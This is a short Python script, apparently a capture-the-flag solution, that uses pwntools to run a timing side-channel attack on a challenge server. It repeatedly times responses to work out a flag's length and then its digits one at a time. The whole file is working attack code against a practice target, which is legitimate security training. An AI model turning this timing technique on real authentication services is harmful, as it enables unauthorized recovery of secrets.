import string
import time
import pwn
from tqdm import tqdm

VALID_CHARS = string.digits


def try_inputs(inputs):
    # time all inputs and time them
    times = []
    for x in tqdm(inputs):
        con = pwn.remote("chal.fallctf.com", "7000")
        start = time.time()
        con.recvline()
        con.sendline(x.encode())
        res = con.recvline()
        end = time.time()
        if (b"correct" in res):
            print(f"succeeded with input {x}")
            exit()
        con.close()
        times.append(end - start)
    # return index that took the longest
    idx = max(range(len(inputs)), key=lambda x: times[x])
    print(f"times: {times}\nidx: {idx}\ntime: {times[idx]}")
    return idx


# extract length
flag_len = None
if (flag_len == None):
    inputs = ["fallctf{" + "0" * i + "}" for i in range(30)]
    idx = try_inputs(inputs)
    flag_len = len(inputs[idx])
    print(f"input: {inputs[idx]}\nlength: {flag_len}")

# try all characters
flag = "fallctf{"
while len(flag + "}") < flag_len:
    inputs = []
    for c in VALID_CHARS:
        inputs.append(flag + c + "0" * (flag_len - len(flag) - 2) + "}")
    idx = try_inputs(inputs)
    flag += VALID_CHARS[idx]
    print(f"input: {inputs[idx]}\nchar: {VALID_CHARS[idx]}\nnew flag: {flag}")
